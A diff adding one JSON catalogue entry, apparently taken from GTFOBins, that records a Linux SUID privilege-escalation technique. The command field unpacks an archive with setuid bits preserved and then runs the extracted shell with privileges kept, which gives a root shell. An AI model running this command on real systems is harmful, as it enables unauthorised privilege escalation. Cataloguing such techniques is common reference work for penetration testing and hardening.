@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-unzip-privilege-escalation",
+  "name": "GTFOBins · unzip (privilege-escalation)",
+  "command": "unzip -K shell.zip\n./sh -p",
+  "description": "Use unzip to privilege escalation via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "unzip",
+    "privilege-escalation"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/unzip/#privilege-escalation",
+  "upstream_id": "unzip/privilege-escalation/0",
+  "category": "gtfobins",
+  "subcategory": "suid",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/unzip/"
+    }
+  ]
+}
